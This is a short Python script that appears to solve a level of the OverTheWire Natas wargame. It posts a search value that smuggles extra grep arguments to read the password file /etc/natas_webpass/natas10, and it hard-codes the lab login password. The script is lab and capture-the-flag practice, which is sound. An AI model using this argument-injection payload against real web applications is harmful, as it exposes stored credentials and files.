import requests

url = 'http://natas10.natas.labs.overthewire.org'
user = 'natas10'
#proxies = {"http": "http://127.0.0.1:8080"}
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
data = {'needle' : '"^" /etc/natas_webpass/natas10 #',
		'submit':'Search'
		}
r1 = requests.post(url,data=data,auth=(user,password))
print r1.text
